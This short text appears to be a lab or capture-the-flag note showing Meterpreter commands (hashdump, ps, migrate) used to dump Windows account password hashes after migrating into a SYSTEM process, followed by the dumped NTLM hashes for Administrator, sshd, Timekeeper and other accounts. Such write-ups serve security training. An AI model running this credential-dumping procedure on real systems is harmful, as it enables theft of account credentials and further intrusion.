Following hashdump was done using meterpreter

Using the following commands:

```bash
$ hashdump # This would fail as we didn't have proper admin access
# migrating to a nt/auth process:
$ ps
$ migrate proc_id
$ hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43d73c6a52e8626eabc5eb77148dca0b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1008:aad3b435b51404eeaad3b435b51404ee:6eea75cd2cc4ddf2967d5ee05792f9fb:::
Timekeeper:1009:aad3b435b51404eeaad3b435b51404ee:901682b1433fdf0b04ef42b13e343486:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::

```